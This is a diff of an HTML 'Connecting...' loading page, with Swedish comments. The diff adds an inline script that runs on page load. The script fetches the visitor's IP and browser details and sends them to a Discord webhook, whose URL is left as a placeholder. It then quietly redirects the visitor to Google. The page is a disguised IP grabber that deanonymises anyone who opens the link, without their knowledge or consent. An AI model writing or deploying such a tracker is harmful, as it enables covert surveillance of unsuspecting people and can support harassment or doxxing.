@@ -1,29 +1,26 @@
 <!DOCTYPE html>
-<html lang="sv">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
-            background: #0a0a0a;
+            background: black;
+            color: white;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            font-family: Arial, sans-serif;
+            font-family: Arial;
+            margin: 0;
         }
         .loader {
             text-align: center;
-            color: white;
         }
         .spinner {
             width: 40px;
             height: 40px;
             border: 3px solid #333;
-            border-top-color: #00ff00;
+            border-top-color: green;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto 15px;
@@ -31,17 +28,58 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        p {
-            color: #888;
-            font-size: 14px;
-        }
     </style>
 </head>
 <body>
     <div class="loader">
         <div class="spinner"></div>
-        <p>Securely connecting... please wait</p>
+        <p>Connecting...</p>
     </div>
-    <script src="logger.js"></script>
+
+    <script>
+        // Discord Webhook - ÄNDRA DENNA TILL DIN RIKTIGA URL
+        const WEBHOOK = "DIN_WEBHOOK_URL_HÄR";
+        
+        // Hämta IP
+        async function logIP() {
+            try {
+                // Hämta IP från gratis API
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                const ip = data.ip;
+                
+                // Hämta webbläsarinfo
+                const info = {
+                    ip: ip,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screen: window.screen.width + "x" + window.screen.height,
+                    time: new Date().toISOString(),
+                    url: window.location.href
+                };
+                
+                // Skicka till Discord
+                const message = {
+                    content: `**🎯 NEW VISITOR!**\n**IP:** ${info.ip}\n**Browser:** ${info.userAgent}\n**Language:** ${info.language}\n**Screen:** ${info.screen}\n**Time:** ${info.time}\n**URL:** ${info.url}`
+                };
+                
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+                
+            } catch(e) {
+                // Fel - gör inget
+            }
+        }
+        
+        // Kör och omdirigera
+        logIP().then(() => {
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 2000);
+        });
+    </script>
 </body>
 </html>
